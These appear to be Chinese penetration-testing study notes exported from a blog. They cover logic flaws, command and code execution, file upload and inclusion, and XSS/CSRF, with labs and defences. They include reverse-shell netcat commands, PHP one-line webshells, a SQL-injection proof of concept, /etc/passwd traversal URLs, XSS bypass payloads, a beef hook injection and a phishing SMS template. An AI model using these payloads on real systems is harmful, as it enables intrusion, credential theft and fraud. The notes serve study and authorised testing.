{"posts":[{"title":"逻辑漏洞","content":"逻辑漏洞 突破功能限制漏洞 前端校验漏洞 无法查询： 删除dis关键字 案例 优惠券 一般每张优惠券都是一段随机字符串key标识，一次只允许使用一张，但有些语言支持 数组提交 json提交 限额 每人每天只允许购买10000元的产品，但每个人都已修改自己每天能购买的最大限额数（仅能由大改小） 用户信息泄露漏洞 泄露信息一般为手机号/姓名/邮箱/身份证号/收获地址/订单/用户名/密码/银行卡等 案例 注册 登录 找回密码，服务器回显差异造成泄露 修复建议：设置验证码防止字典遍历 服务端多余回显 用户登录之后服务器会从数据库读取用户数据，并通过js或json返回给前端，以便于前端一些功能快速响应（同时可能造成不必要的数据回显（密码等）） 掩码前后不一致造成信息泄露 越权 干了不属于自己权限范围内的事就叫越权 水平越权 垂直越权 案例 id越权 php？id=140012 关注业务点： 收获地址 用户 编辑 预览（草稿，回收站） 报告（采购） 订单（抽奖，付款） 绕过手法1：删除多余字段 tooken 删除 / null / md5验证 /多加123456毁掉token 绕过手法2：cookie越权 cookie是否有身份表示字段 / 双音素越权 绕过手法3：修改帐号 输入正确的旧密码和要更新改的密码后抓包将loginid改为其他帐号（例如帐号改为admin，新密码为123） 当前密码改为NULL 绕过手法4：禁用js 禁用本地js验证即可未授权绕过后台（看有没有危害） 绕过手法5：双因子 uuid / uid都改 绕过手法6：修改url路径参数实现垂直越权 app=user app=admin 绕过手法7：思路重要 确认收获信息，改id看能不能确认别人的账单 用户中心 -- 地址管理 --- 常用地址 2. 拦截常用地址查询请求，将手机号改为其他人的手机号 猜测页面 普通用户（只有阅读权限） read_article 管理员用户 edit_article 遍历漏洞 攻击者归纳总结服务器资源唯一标识的变化规律后，通过一定手段获取大量可产生利用价值资源的一类漏洞 案例 打车平台的附近位置 达成平台允许乘客根据当前位置匹配附近出租车司机信息 GPS伪造技术，遍历全国司机个人信息 base64遍历 MTk5OQ== MjAwMA== 弱口令漏洞 暴力破解 大字典 高线程遍历 验证码ocr 有点平台规定次数会锁用户：那可以通过爆破导致用户上锁，无法正常使用平台（618限时购买/抢票） 固定密码攻击 固定密码 遍历账户 得到密码为固定密码的所有账户 撞库攻击 社工库（实话实说 我的好多地方密码是一样的） 验证码漏洞 暴力生成 （短信轰炸） 重放 绕过 垃圾字符 +86 +空格 双写手机号 XFF ip伪造 暴力破解 设置阈值 暴力生成破解 1个验证码只允许破解几次 但可以无限生成 生成一次破解一次 内容生成伪造 xx公司 你正在充值密码，短信验证码是：xxx xx公司 你正在充值密码，短信验证码是：xxx，因系统升级，您需要将验证码发送到：xxxxx 响应包存在短信验证码 绑定关系失效 先用自己手机号获取验证码 再改为别人手机号注册 统一初始化 对从未发送过短信的手机号短信验证码默认设置为 null none 0 00000 123456 短信验证码 ocr绕过 任意用户注册/登录/密码充值 越权修改（找回密码要素） 第一步输入邮箱 第二步验证身份 这种就可以看链接里是否有问题，可以改一改，跳步 验证密码key暴力破解 发个邮箱说验证码是啥 暴力破解 验证链接可被预测 重置链接md5揭密 去发送修改请求 用自己构造的重置链接对密码进行重置 通过验证后，修改密码时越权修改 用自己账户通过验证来到修改密码这一步 修改请求包中的用户信息来修改他人用户密码 找回密码邮箱改为自己的 chagepasswd.php?email=xxxx.com chagepasswd.php?email=自己的.com chagepasswd.php?email[0]=xxxx.com&amp;email[1]=自己的.com 修改返回包 只进行前端验证，验证成功后提交给后台，后台不做验证直接记录 注册失败false改为true/success url跳转 redirect.php?url=http://www.baidu.com 可能造成欺诈行为 常见参数 绕过 单斜线：http：//www.xx.com/redirect.php?url=/www.evil.com 缺少协议（双斜线）：http：//www.xx.com/redirect.php?url=//www.evil.com 多斜线/ 反斜线 / #号 / ？号 / .. / \\ / 双写 利用@绕过：https://www.xxx.com/redirect.php?url=//www.evil.com@www.evil.com url=evil 可能跳转到www.evil.com ","link":"https://xmoct.github.io/post/gFF8jESS-/"},{"title":"3. 信息收集","content":"信息收集 前言 渗透的本质是信息收集 信息收集在整个渗透测试流程中是⾮常重要的步骤，是决定攻击是否成功的决定点。 信息收集决定之后的攻击⾯或漏洞扫描的范围，也决定整个攻击过程中对⾃⼰和⽬标的定位。 目标（信息收集） 能力 (知识点的串联) 攻防的体系是知识点的串联（ATT&amp;CK） 网站推荐 https://y231028.github.io/red_checklist/cn/index.html 信息收集的基本要求： 全⾯： 做到对⽬标所有的业务⾯和⾮业务⾯的存在点进⾏全⾯的信息收集。 准确： 注意 对于收集到的信息尤其是重要信息要再三确认其信息的准确性，对信息的内容中所涉及的技术点要⼿动查看。 时效： 对于收集到的信息要注意信息产⽣的时间和收集到的时间，是否具有时间差，时间差能否接受，如果存在失效 的信息要及时清除。 隐匿： 降低被发现度，提⾼隐蔽性。 细⼼，耐⼼，这两点⾮常⾮常重要。 分类： 主动信息收集 被动信息收集 被动信息收集 通过手工或工具的使用收集目标在互联网以暴露的资产 被动信息收集的优缺点： 优点： 隐蔽性⾼，不容易被发现 收集的信息量和覆盖⾯⽐较⼤ 缺点： 收集到的信息中时效性和准确性不⾼ ⽆法收集到敏感或者未公开的信息 主动信息收集 主动信息收集的基本结构 由攻击者主动发起的对资产进行扫描或请求的行为 基本流程： 由攻击者主动发起⾏为或请求 ⽬标受到⾏为或请求影响并发出反馈 攻击者获得反馈并判断特征 主动信息收集的优缺点： 优点： 信息的针对性强 信息的准确度和时效性⾼. 能收集到未公开的敏感信息. 缺点： 容易暴露，被发现的⻛险⾼ 收集的信息量和覆盖⾯⽐较少 总结 公司名称 域名 ","link":"https://xmoct.github.io/post/gx8T_8GeP/"},{"title":"实战SRC挖掘","content":"实战挖掘 泛微e-cology sql注入 厂商发布漏洞补丁 下载分析补丁 按照时间找出补丁文件 unzip -l e-***.zip | grep &quot;2023-07&quot; 分析补丁文件（不懂java也没关系 扔给chatgpt） 去weaver\\file\\filedownloadforoutdoc.class路径中去找（sql注入可能的函数 / 补丁包中的参数） POC filed=1+WAITFOR+DELAY%@&amp;):):%%27&amp;isFromOutImg=1 该poc为 sqlserver 延时注入 / 可替换其他数据库延时注入代码 环境搭建，漏洞复现 编写poc，批量刷洞 https://github.com/y231028/Sheep_poc/blob/main/OA%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology_filedownloadforoutdoc_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/ecology-oa-filedownloadforoutdoc-sqli.yaml 交cnvd （通用型）/ cve 根据时间差能换证书 偷懒小技巧 chatgpt 先用一些半自动化的审计工具 拿到一些可能存在漏洞的代码的位置或者参数 把这些可能存在漏洞的文件 复制粘贴给chatgpt 分析上述代码是否存在漏洞，如果存在请给出具体的代码块（特别注意漏洞代码块周围if等条件判断语句的绕过），简述漏洞原理，给出漏洞利用方法，（不要使用删除数据等危险方法进行漏洞验证），给出修复建议和修复后的代码示例 chatgpt一般不会判断存在漏洞的代码块周围的条件判断 nuclei https://nuclei.projectdiscovery.io/templating-guide/ https://github.com/ExpLangcn/NucleiTP/tree/main/TPALL https://github.com/Threekiii/Awesome-POC https://medium.com/shibinco/create-a-telegram-bot-using-botfather-and-get-the-api-token-900ba00e0f39 ","link":"https://xmoct.github.io/post/7-rpwCJ5H/"},{"title":"自动化扫描工具","content":"rengine + hackeone 简介 https://rengine.wiki/ reNgine 工具集合了子域名扫描、目录扫描、端口扫描、网站截图、CMS 扫描、漏洞扫描、消息通知、自动向 HackerOne 提交漏洞 等等的功能 安装 环境要求 建议4核4G docker docker-compose make git 开始安装 安装 rengine clone Rengine git clone https://github.com/yogeshojha/rengine &amp;&amp; cd rengine 编辑 .env vim .env 配置最大最小速度 chmod +x install.sh ./install.sh 访问 https://127.0.0.1 即可(我80端口被另一个服务占用，遂修改了docker-compose.yml 映射到了33443端口) rengine + hackeone 基础配置 hackeone项目筛选 https://hackerone.com/ （选择的是 有赏金 / web应用的） 以Starbucks为例子 找到授权的星巴克 domain 将星巴克的相关domain填入到targets中 在组织中给其建立一个组，并将目标添加进去 自动化报告 设置hackeone 用户名和api 调整报告样式 对星巴克进行定期Full Scan扫描任务 资产+naabu+httpx+nuclei+xray+notify 寻找赏金资产 https://chaos.projectdiscovery.io/#/ 自动方案流程 使用脚本去获取 projectdiscovery 平台的所有资产，资产侦察与收集就交给 projectdiscovery了 把下载的资产对比上次 Masterdomain 数据，判新当前是否有新增资产出现，如果没有就结束，就等待下一次循环 如果有，就把新增的资产提取出来，创建临时文件，并把新资产加入到 Masterdomain 把新增资产使用 naabu 进行端口扫描，把开放的端口使用 httpx 来验证，提取 http 存活资产 把 http 存活资产送往 nuclei 进行漏洞扫描，同时也送往 Xray，默认使用 Xray 的基础爬虫功能扫描常见漏河 Xray 的扫描结果保存成 xray-new-s(date +%F-%Thtm，也可以同时添加 webhook 模式推送 nuclei 漏洞扫描结果用 notify 实时推送、 nuclei 与 xray 都扫描结束后，等待下一次循环，这一切都是自动去执行 配置 工具准备 https://github.com/PhotonBolt/chaospy https://github.com/tomnomnom/anew https://github.com/projectdiscovery/naabu https://github.com/projectdiscovery/httpx https://github.com/projectdiscovery/nuclei/blob/main/README_CN.md https://download.xray.cool/ https://github.com/projectdiscovery/notify ","link":"https://xmoct.github.io/post/Q0fCuf4Xl/"},{"title":"命令执行和代码执行","content":"命令执行 概述 web程序使用了命令执行函数，用户通过浏览器提交执行系统命令，由于服务端没有对用户提交的命令做严格过滤，导致用户可以通过浏览器执行恶意系统命令，从而导致命令执行攻击 思维导图 命令执行示例 http://192.168.142.53/pikachu/vul/rce/rce_ping.php 正常ping 没有任何危害 ping -t 127.0.0.1 但一切输入都是有害的，当我们加入命令拼接符时，一些铭感信息也会被带出来 ping 127.0.0.1 -n 1 &amp; ipconfig 命令拼接符 linux / mac / windows通用 linux / mac 特殊 ###补充 : 读文件命令 反弹shell 正向shell nc -lvvp 1028 -e /bin/bash 这个命令会在本地启动一个 netcat 监听器，监听端口号为 1028 （使用 -p 选项指定），并打开详细输出模式（使用 -v 选项）。使用 -e 选项指定一个在客户端连接到监听器之后要执行的程序。在这个命令中，程序被指定为 /bin/bash，这将为客户端生成一个交互式的 Bash shell。 攻击者可以通过本机使用nc建立连接nc 服务器ip 1028 netcat基本用法 反弹shell 找一台公网ip的服务器nc -lvp 1028 受害服务器执行nc -e /bin/bash 1.1.1.1 1028 防火墙策略一般只会过滤从外向内流量，对出向流量过滤较为宽松 反弹shell相当于为其他命令执行操作打开了一扇大门，在命令注入场景下，首先要考虑的就是能否利用该漏洞反弹shell获取服务的稳定控制权 漏洞检测 黑盒检测 有回显 linux windows 命令执行无回显 &gt; 写入文件 延时---判断 HTTP请求--判断 Dnslog--判断 白盒检测 php代码审计 危险函数 参数用户可控 Java代码审计 危险函数 参数用户可控 bypass 命令拼接 文件名 空格代替 命令绕过 命令执行的各种符号 漏洞挖掘 常见思路 代码执行 漏洞点 按找ssrf方法测url（wget / curl请求） 第三方接口调用（网站邮箱注册，填写邮箱，邮箱验证处） 文件下载/删除/查看（wget/curl/cat/rm）等 测试小技巧 文件上传 sleep 10 filename 测试filename：|| wget%20ip 测试上传处下的名称： payload|payload&amp;payload 测试邮箱 wget%209服务器地址 / xmoct@gamli.com 思路 找可能存在的点 ceye判断是否存在 3.向自己的服务器发出请求，看日志（curl / wget /命令拼接） 外带数据 / 命令执行 / 验证危害 其他 熟悉netcat，在kali和windows上尝试反弹shell和正向shell 自行整理bash / perl / python / ruby 反弹shell脚本（可chatgpt） 靶场练习 Shellshock漏洞 （会写yaml的可以自己写poc） 代码执行 概述 web应用程序 使用了代码执行函数，但对用户输入的参数没用进行严格的过滤，导致用户拼接输入恶意代码，并执行造成代码执行漏洞 RCE 远程命令执行 PHP远程代码执行 白盒审计 表达式 说明 例子 mixed eval(string,$code) 把字符串code作为php代码执行 eval(&quot;phpinfo();&quot;); bool assert(mixed @assertion[,string $description] ) assert()会检查指定的assertion并在结果为FALSE时采取适当的响应，如果assertion时字符串，他将会被assert（）当作php代码执行 assert('system(&quot;whoami&quot;)'); mixed preg_replace ( mixed $pattern ,mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。若pattern处存在e修饰符时(5.5.0版本/e修饰符已经被弃用了)，pattern处存在e修饰符时(5.5.0版本/e修饰符已经被弃用了)，pattern处存在e修饰符时(5.5.0版本/e修饰符已经被弃用了)，replacement会被当作php代码执行 preg_replace (&quot;/test/e&quot;,&quot;system(&quot;whoami&quot;),‘test’); call_user_func(callable callback,mixed...callback, mixed ...callback,mixed...args): mixed 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。传入call_user_func()的参数不能为引用传 call_user_func('system','whomaiy'); call_user_func_array(callable $callback, array $args): mixed 把第一个参数作为回调函数（callback）调用，把参数数组作（args）为回调函数的的参数传入。 call_user_func_array('system',array['whomaiy']); create_function(string args,args,args,string $code) args是要创建的函数的参数，code是函数内的代码 create_function('code′,′code&#x27;,&#x27;code′,′echo code;'); array_map(callable $callback, array $array1[,array $....]) array_map-为数组的每个元素应用回调函数 array_map('assert','phpinfo()') uasort(array,myfunction); uasort() 使用用户自定义的比较函数对数组按键值进行排序。提示：请使用 uksort() 函数对数组按键名进行排序，该函数使用用户自定义的比较函数进行排序。 usort(array,myfunction); usort() 使用用户自定义的比较函数对数组进行排序。 usort(...$GET);?1[]=phpinfo()&amp;1[]=123&amp;2=assert(要执行的命令就放在第一个数组参数) ${php代码} ${phpinfo()}; 1 文件包含 就是如果 我使用了文件包含函数 ，那被包含的对象 只要存在php格式的代码，他就会被当成php代码进行执行 ，无需考虑文件本身时什么类型 本地文件包含 &lt;?php phpinfo();?&gt; include(1.txt) 远程文件包含 [http|https|ftp]://localhost/test.txt 伪协议 file:// 协议 - 用于访问本地文件系统 - file://[文件的绝对路径和文件名] php:// 协议 - 访问各个输入/输出流（I/O streams） php://filter - 用于读取源码 - php://filter/read=convert.base64-encode/resource=[文件名] php://input - 用于执行php代码 - php://input + [POST DATA] zip:// 访问压缩文件中的子文件 - zip://[压缩文件绝对路径]%23[压缩文件内的子文件名] bzip2:// - compress.bzip2://file.bz2 zlib:// 协议 - compress.zlib://file.gz - data://text/plain, - data://text/plain;base64, data:// 协议 - 数据流封装器 http:// - 以只读访问文件或资源 - https:// 协议 http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt phar:// 协议 - 访问zip格式压缩包内容 http://127.0.0.1/include.php?file=phar://D:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt phar://协议对象注入技术 可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 压缩包，配伪协议 php://filter --常用于读文件（白盒审计） ?file=php://filter/read=convert.base64-encode/resource=index.php php://input:---这个可用，远程包含一般也可用 场景 日志文件 其他 ctfhub技能树rce的练习 搜索php文件包含伪协议用法 CVE-2019-10758 ","link":"https://xmoct.github.io/post/0sWKZajVF/"},{"title":"文件上传和文件包含","content":"任意文件上传 简述 任意文件上传漏洞往往是服务器提供一定上传接口，但由于对上传文件类型限制逻辑不严格，导致被绕过；攻击者可以直接上传脚本资源文件来控制服务器，也就是sql注入漏洞中介绍的webshell 靶场练习 找靶场 fofa.info http://192.168.142.53/pikachu/vul/unsafeupload/upload.php 一句话木马 前端校验绕过 禁用js 插件 Enable JavaScript bp绕过 先上传图片 ， 然后bp抓包 ，改为php文件 &lt;?php phpinfo();?&gt; http://192.168.142.53/upload/phpinfo.php upload 1源码分析 前端检验上传文件是否为jpg / png /gif格式 后端校验绕过 文件头 常见图片文件头 在php文件前加图片文件头来绕过 upload-13 MIME 对文件类型检查有缺陷-检查Content-Type标头是否与MIME 类型匹配 上传 webshell.php 抓包 修改上传的Content-Type 类型为允许的类型 image/jpeg upload 2代码分析 后缀名 黑名单 绕过：找一些遗漏的后缀名 上传php文件 uplaod.php &lt;?php @eval($_REQUEST['moyv'])?&gt; 上传后缀名php5 /phtml等 uplaod.php5 &lt;?php @eval($_REQUEST['moyv'])?&gt; upload3 - 关键代码 特殊文件（了解解析漏洞后再做） .htaccess 特殊的配置文件，改写apache的配置 .user.ini特殊文件，apache,nginx都能用 白名单 只允许特定的文件名通过 文件包含(后面讲) 判断黑白名单 上文件过程中，随意更换文件后缀名.sjdfla;fsljfdlsajfljdslflsajf 文件内容 过滤php特征 <? 关键函数，关键字 函数 大小写 动态拼接 免杀 异或运算................. ?&gt; 条件竞争绕过 如果一个网站虽然采用了白名单方式过滤上传文件，但是它在程序是先允许任何文件上传到服务器，再去判断文件扩展名来决定文件是否删除（存在时间差），那只要攻击者快速发送请求，在时间差内访问一次恶意文件即可 http://198.74.107.99:8081/Pass-18/index.php 随意上传一张图片: 成功后查看图片，可以看到上传后的路径如下：(一般只要右键能找到图片地址的，在响应包里就有) 创建一个php文件（要求一旦被访问 即在服务器上写一个webshell文件） bp intruder 不断发送上传的php文件（制造该文件持续在服务器的机会） 不断访问上传的php文件（只要有一次访问到就可创建webshell文件） 找到状态码 200即可 代码分析 先通过move_uploaded_file(tempfile,upload_file)将文件上传至服务器中。 上传完毕后通过in_array(fileext,ext_arr)检查文件名后缀 如果后缀名合法，则对文件进行重命名，上传完成 如果后缀名非法，则删除文件。 漏洞挖掘 基本思路 先上传一张正常图片，看返回结果是什么，是否显示上传后的路径，并能试验是否能访问到，再去测试漏洞 案例分析 头像上传 上传头像，抓包 上传phpinfo 验证 &lt;?php phpinfo();?&gt; 上传一句话，蚁剑链接 （xss）挂黑页 1、参考之前xss文章 2、因为xss本质是JavaScript代码 ，其实可以挂黑页 3、一般众测能给到中危害（除了某些会追你责的xx以外） 危害 防御 其他 了解解析漏洞 Apache HTTPD 多后缀解析漏洞 https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/ Nginx解析漏洞 https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/ Apache换行解析漏洞 https://vulhub.org/#/environments/httpd/CVE-2017-15715/ 靶场通关秘籍 https://github.com/LandGrey/upload-labs-writeup Weblogic任意文件上传漏洞（CVE-2018-2894） https://vulhub.org/#/environments/weblogic/CVE-2018-2894/ Apache Flink文件上传漏洞（CVE-2020-17518） https://vulhub.org/#/environments/flink/CVE-2020-17518/ 蚁剑使用 文件包含 在网站的开发人员在开发网站的时候，会把经常重复使用的函数或者特定的页面写到单个文件中，需要使用的时候就直接调用此文件即可，而无需再次浪费时间再次编写，这种操作通常被称为文件包含。如果我们没有对文件的来源进行严格的审查就可能会导致文件包含漏洞 靶场练习 http://101.43.1.181/pikachu-master/vul/fileinclude/fileinclude.php php文件包含函数 漏洞挖掘 常见思路 案例分析1 本地文件包含（CVE-2021-43798） https://xxx.org/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd 案例分析2 https://www.xxxx.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js Base64解码：file:///etc/passwd#.js 之所以使用#，是因为url的结尾必须是javascript，但要在url中忽略它，我使用#之后的内容会忽略在url中 案例分析3 黑灰产 代码审计 文件上传 jpg 文件包含 jpg 拿shell ###危害 防御 其他 php文件包含函数区别 学习使用Potential Vulnerability Indicator https://github.com/PortSwigger/potential-vulnerability-indicator vulhub文件包含漏洞 https://vulhub.org/#/environments/php/inclusion/ ","link":"https://xmoct.github.io/post/9wK7KUt6d/"},{"title":"跨站脚本攻击","content":"XSS 简述 Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。它是指恶意攻击者往web页面中插入恶意script代码，当用户浏览该页面时，嵌入其中的script代码被执行，从而达到恶意攻击用户的目的 <!-- more --> 一般XSS可以分为如下几种常见类型： 反射性XSS; 存储型XSS; DOM型XSS; <!-- more --> 靶场练习 https://github.com/xmoct/pikachu/vul/xss/xss.php 反射型xss 一般是用户输入的参数内容会直接回显在页面上，通过提交url来构造攻击代码。反射型xss的攻击需要将url发送给受害者，诱导受害者点击才会触发 GET型 提交1 效果 提交 &lt;script&gt;alert('欢迎来到XSS学习')&lt;/script&gt; 效果 常见弹窗函数 confirm() prompt() alert() 代码分析 存在危险函数echo 存在危险函数echo 追踪变量$html POST型 登录进去 跟前面一样，只不过这里传递参数方式变成了post 利用方法 构造html ，让html实现自动提交表单的功能（chatgpt） 让受害者点击html链接 xss平台获取cookie ， 替换cookie 登录成功 html样例： xss平台 https://xss.pt/xss.php 存储型xss 攻击者将构造的恶意代码传入服务器，并存储在服务器端，在其他用户下一次访问一个看似正常的连接时，就会触发并执行恶意代码 留言 闭合标签 &lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;p&gt; 代码分析 将传入的值 写进插入数据库中 从数据库中查询 DOM型xss 与反射型xss相似 ，但他不是服务端直接回显出JavaScript代码，而是由于开发者在编写前端代码时，写在html中Javascript代码和引入的JavaScript资源文件存在缺陷导致的; 触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情 DOM概述 https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Introduction Javacript伪协议 javascript:alert(1) 代码分析 追text Xss漏洞检测 反射型 传统方法 传统检测方法即为直接发送xss利用代码的形式，然后检测页面中是否存在被植入的xss代码 是否可以插入&lt;script&gt;标签 是否可以插入任意标签+on事件组合 是否可以插入&lt;iframe&gt;标签+src组合 是否可以插入标签+href组合 模糊测试 不直接发送xss payload，而是通过检测不同回显点位置下的关键字符过滤情况的方法，被称为模糊xss漏洞检测技术 判断回显参数 发送Payload请求（简化特殊字符序列） 根据回显点位置和过滤字符情况综合对比 &lt;script&gt; 标签内 -- 可直接执行JavaScript代码 &lt;script&gt;aa&lt;/script&gt; 在标签on事件之内，&lt;img onerror='aa'&gt; 在Javascript:之后,&lt;iframe src=&quot;javascript:aa&quot;&gt; &lt;script&gt;标签外 一般使用一下方法进入&lt;script&gt;标签 引入标签法；引入&lt;script&gt; 或&lt;img&gt;等其他标签on事件 引入元素法；回显点如果位于标签内，则直接引入on事件 JavaScript伪协议法； &lt;a href=&quot;javascript:alert(1)&quot;&gt;xx&lt;/a&gt; &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; 存储型 存储型与反射型很大的区别是,反射型xss的回显点一般就是请求提交后的响应页面，二存储型xss的回显点不固定，有些是响应页面，有些则不是（例如：管理员后台查看），所以存储型的xss检测一般使用盲打技术 xss盲打 在可能存在xss的点插入payload 现在本地用python起一个http服务 python -m http.server &lt;script&gt;window.open('http://127.0.0.1:8000')&lt;/script&gt; 如果xss存在，则会打开新窗口，访问 http:127.0.0.1:8000 假设我们现在是管理员去看评论 看效果 此时 ，我们只需检测我们对我们的http服务进行监控即可判断xss是否被触发 一般在测试中，我们会用到xss平台来进行监控（beef-xss和自建xss平台） DOM型 挖掘难度较大 ，需要分析网站加载的Javacript代码;检查网页中任何可能存在缺陷的攻击点，包括且不仅限于以下范围 例1： 创建一个正则表达式reg，用于匹配URL中的参数名和值。(|&amp;)表示参数名前面可以是字符串的开头或者是&amp;符号，([&amp;]*)表示参数值可以是任意字符除了&amp;，(&amp;|$)表示参数值后面可以是&amp;符号或字符串的结尾。 使用window.location.href获取当前页面的URL，并使用substr(1)去除URL中的第一个字符（通常是?符号）。 使用match(reg)方法对URL进行正则匹配，将匹配结果存储在变量r中。 如果匹配结果r不为null，则使用unescape(r[2])解码参数值，并将其返回。 如果匹配结果为null，则返回null。 payload:welcome.php?username=&lt;script&gt;alert(1)&lt;/script&gt; 例2： 使用javascript伪协议进行xss攻击 payload: ?redirectURL=javascript:alert(1) 例3： 使用条件语句if (window.postMessage)检查window.postMessage是否存在，即浏览器是否支持该方法。 如果支持，则通过window.addEventListener方法给当前窗口添加一个message事件监听器。 在事件监听器的回调函数中，使用eval(e.data)对接收到的消息进行求值（执行）。e是事件对象，e.data表示接收到的消息内容。 payload： 在&lt;body&gt;标签内，有一个&lt;iframe&gt;元素，其src属性指向http://www.xxx.com/1.php 网址。在&lt;iframe&gt;标签上有一个onload事件处理程序，当&lt;iframe&gt;加载完成后，会调用函数xss()。 在&lt;script&gt;标签中定义了函数xss()。 在函数xss()中，使用window[0].postMessage(&quot;alert(1)&quot;, &quot;*&quot;)尝试向指定的窗口发送一条消息。 postMessage()方法用于在跨窗口通信中发送消息。第一个参数是要发送的消息内容，这里是&quot;alert(1)&quot;，表示要弹出一个警示框。第二个参数&quot;&quot;表示消息接收方的目标源，这里是通配符，表示可以与任何源进行通信 例4： payload Xss的绕过方式 ###大小写绕过 针对某些黑名单，没有将输入的参数转变为小写产生这个漏洞 payload: &lt;scRIpT&gt;alErt(1)&lt;/ScrIpT&gt; 双写绕过 针对将我们的敏感标签替换为空，但是未加循环验证导致 payload: &lt;scr&lt;script&gt;ipt&gt;aleralert(1)t(1)&lt;/scr&lt;/script&gt;ipt&gt; 或者： &lt;scr&lt;--that--&gt;ipt&gt; 第二种利用注释符将中间置空 编码转义 这里可以利用编码加密绕过一些关键词黑名单的过滤 payload： &lt;script&gt;eavl(atob(&quot;PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;));&lt;/script&gt; eval()用于将字符串当作程序执行，atob()用于解密base6 &lt;a href=&quot;data:text/html;base64&quot;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;1&lt;/a&gt; 除了base64，我们也可以通过url多次编码来绕过，这里就不做演示。 实体编码绕过 这里其实就是利用&lt;svg&gt;标签将后面编码后的字符还原 payload: &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt; 实体编码转换就是将ascii编码转unicode 常用实体编码 常用编码查询网站 https://symbl.cc/cn/collections/punctuation-marks/ 平替符号绕过 其实就是一些符号被过滤，我们使用一些可以产生同样效果的符号进行替换。 用/代替空格 用反引号代替括号、双引号 用throw代替括号 用html实体编码:代替冒号 用jsfuck编码绕过大部分字符过滤 用反单引号代替（） 包括用--&gt;注释符来把无法闭合的注释掉 符号被编码 这里符号被实体编码，但是本身闭合的符号还有=可以用 在input标签中可以使用onclick来触发 x&quot; onclick=alert(1) // 其他非黑名单可用标签 漏洞挖掘 常见思路 XSS 分类 反射型XSS 存储型XSS DOM XSS 挖掘思路（有框必插） 第一步：寻找插入点 反射型：不跟后端数据产生交互的点 存储型：跟后端数据库产生交互的点 DOM XSS 页面重定向 取值写入页面或动态执行 使用存在的缺陷的第三方库或通用组件 第二步：测试注入点提交的内容是否可以注入到页面 判断是否出现过滤行为（模糊测试） 第四步：根据注入点内容所在网页位置部分的DOM 结构构造Payload进行测试 常见漏洞点 日志处 订单处 文章处 图片上传处 留言处 聊天室 请求头处 作品处 反馈处 发帖处 资料处 模板处 工具推荐 https://github.com/xmoct/FxxkXSS 案例分析 url中的xss 值为1时 页面不存在 值为payload：&lt;script&gt;alert('url')&lt;/script&gt;时，弹框 留言处 输入payload: xss#&lt;img src=1 onerror=alert('s')&gt; //可能不会 输入payload: xss#&lt;img src=1 onerror=alert(1)&gt; //弹窗,document.domain 弹窗 文件上传 上传头像 改文件后缀名 / 改content-type：text/html &lt;script&gt;alert(1)&lt;/script&gt; 弹窗 icloud Drive 在iCloud Drive中，可以上传文件并将上传文件移动到文件夹中，这些文件和文件夹可以通过电子邮件和icloud分享给其他用户 上传的每个文件夹或文件都有一个图标，可以直接编辑详细信息名称 &lt;svg&gt;&lt;img src onerror=javasript&amp;#58;alert&amp;#40;1&amp;#41;&gt; &lt;svg javasript&amp;#58;alert&amp;#40;2&amp;#41;&gt; 未过滤 html 标签，这里存在 XSS 漏洞 把文件共享给受害者，受害者打开小窗口时，才会受到 XSS 的攻击 （2021年的洞）最终支付了9000$（切记，有框，有回显，就试着x一x） 用户注册 注册信息填xss 别人访问你信息时就会触发 危害 盗取cookie 植入键盘记录器。 攻击受害者所在的局域网。 代理转发流经被攻击者的所有 Web 流量，即实施中间人攻击。 窃取或篡改应用 cookie 用于会话劫持。 更改被攻击者 Web 应用的显示内容。 绕过 CSRF 安全防护措施。 创建包含恶意 JavaScript 代码的虚假网站以及到该网站页面的链接。 发送嵌入恶意 Web URL 的电子邮件。 使用 URL 短码隐蔽真实 URL。 漏洞防御 html回显内容在html页面标签之外时，实体化左右尖括号 html回显内容在&lt;script&gt;代码快时，实体化左右尖括号、“/”、单引号等可能闭合标签的字符 html回显内容通过postmessage作为输入点时 检测messageEvent的来源是否在白名单内，同时检测来源数据是否合法，是否存在恶意代码 xss修复方案 xss修复方案 `https://zhuanlan.zhihu.com/p/262038810 <!-- more --> <!-- more --> 工具 在线生成xss http://xssor.io/#ende beef-xss 输入新密码 sudo beef-xss 登录 beef:beef 插入&lt;script src=&quot;http://192.168.142.53:3000/(自己的kaliIP地址):3000/hook.js&quot;&gt;&lt;/script&gt; 上线 漏洞利用 任务 JavaScript的on事件 并进行整理/实验 xssValidator使用 https://www.freebuf.com/sectool/269231.html 了解beef-xss基本用法 写通关文档（思路 / 遇到了哪些问题 /怎么解决的） https://xss.tesla-space.com/ Diango debug page xss漏洞（CVE-2017-12794）（看懂代码的就写一份报告 / 看不懂的就按照流程走一遍） https://vulhub.org/#/environments/django/CVE-2017-12794/ 尝试挖挖src（有框必×）（上传文件的地方也可以试试） xss脑图 CSRF Cross-site request forgery 简称为“CSRF”，中文名为“跨站请求伪造漏洞”，是指网站的功能存在某些缺陷，可允许攻击者预先构造请求诱导其他用户提交该请求并产生危害 靶场练习 GET型 先随便登录一个人的账号（点击提示会显示账号） 我们修改信息 ，并在网络 监控文档 ---&gt; 得到一个修改信息的链接 我们退出登录 ，换另外的账号进行登录 ，然后点击链接 代码分析 没有验证cookie的值 POST型 与get型没什么区别 